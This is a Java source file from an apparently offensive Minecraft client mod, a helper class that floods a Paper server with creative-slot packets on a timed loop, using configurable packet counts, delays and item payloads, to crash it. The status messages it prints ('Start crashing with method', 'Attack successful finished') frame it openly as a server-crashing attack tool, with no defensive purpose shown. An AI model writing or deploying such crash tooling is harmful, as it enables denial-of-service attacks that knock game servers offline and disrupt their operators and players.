package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.function.IntFunction;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.protocol.Protocol;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.packets.PacketCodec;
import me.dannycrasher.client.protocol.packets.play.PacketCreativeSlot;
import net.minecraft.client.Minecraft;
import net.minecraft.world.level.GameType;

final class CreativeAttackHelper {
	private CreativeAttackHelper() {
	}

	static void warnIfNotCreative(ModuleContext context) {
		Minecraft minecraft = Minecraft.getInstance();
		if (minecraft.gameMode == null || minecraft.gameMode.getPlayerMode() != GameType.CREATIVE) {
			context.sendMessage("<yellow>Warning: local gamemode is not creative. Server must have you in creative for Paper creative-slot modules.");
		}
	}

	static ScheduledExecutorService start(
			Module module,
			ModuleContext context,
			ScheduledExecutorService previous,
			int packets,
			int threadSleep,
			int loopAmount,
			int slot,
			ItemStack item
	) {
		return start(module, context, previous, packets, threadSleep, loopAmount, ignored -> slot, ignored -> item);
	}

	static ScheduledExecutorService start(
			Module module,
			ModuleContext context,
			ScheduledExecutorService previous,
			int packets,
			int threadSleep,
			int loopAmount,
			IntFunction<Integer> slotProvider,
			IntFunction<ItemStack> itemProvider
	) {
		if (previous != null && !previous.isShutdown()) {
			previous.shutdownNow();
			context.sendMessage("Previous attack <red>stopped<white>!");
		}

		module.setEnabled(true);
		warnIfNotCreative(context);

		if (!Protocol.FULL_ITEM_PROTOCOLS.contains(ViaFabricPlus.getImpl().getTargetVersion().getVersion())) {
			module.setEnabled(false);
			context.sendMessage("<red>You cant use this method on the version you are currently on. Change the version in viafabric");
			return previous;
		}

		context.sendMessage("Start crashing with method: <aqua>" + module.getName() + "<white>!");

		AtomicInteger check = new AtomicInteger(0);
		ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor();
		Runnable clickTask = () -> {
			if (!module.isEnabled() || !Protocol.isSendingEnabled() || check.get() == loopAmount
					|| (Minecraft.getInstance().getConnection() == null || !Minecraft.getInstance().getConnection().getConnection().isConnected())) {
				executorService.shutdown();
				module.setEnabled(false);
				if (Minecraft.getInstance().getConnection() != null) {
					context.sendMessage("Attack <green>successful <white>finished!");
				}
			} else {
				int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
				int iteration = check.get();
				PacketCodec.sendPacket(new PacketCreativeSlot(
						protocol,
						slotProvider.apply(iteration),
						itemProvider.apply(iteration)
				), packets);
			}

			check.getAndIncrement();
		};
		executorService.scheduleAtFixedRate(clickTask, 0, threadSleep, TimeUnit.MILLISECONDS);
		return executorService;
	}

	static void shutdown(ScheduledExecutorService executorService) {
		if (executorService != null) {
			executorService.shutdownNow();
		}
	}
}
